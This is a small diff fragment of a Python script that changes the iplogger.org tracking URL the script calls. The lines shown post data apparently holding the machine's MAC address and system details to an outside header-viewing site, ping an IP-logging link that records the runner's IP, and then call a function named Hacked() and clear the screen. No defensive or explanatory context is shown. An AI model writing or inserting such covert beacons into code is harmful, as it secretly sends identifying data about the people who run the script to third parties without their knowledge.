@@ -30,7 +30,7 @@ try:
         }
         macsend = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=reqMac)
     # Cut
-        Log_ip = requests.get('https://iplogger.org/2Dpz47')
+        Log_ip = requests.get('https://iplogger.org/2DTQ57')
         print(Log_ip,macsend,syssend)
     Hacked()
     sysos('clear')
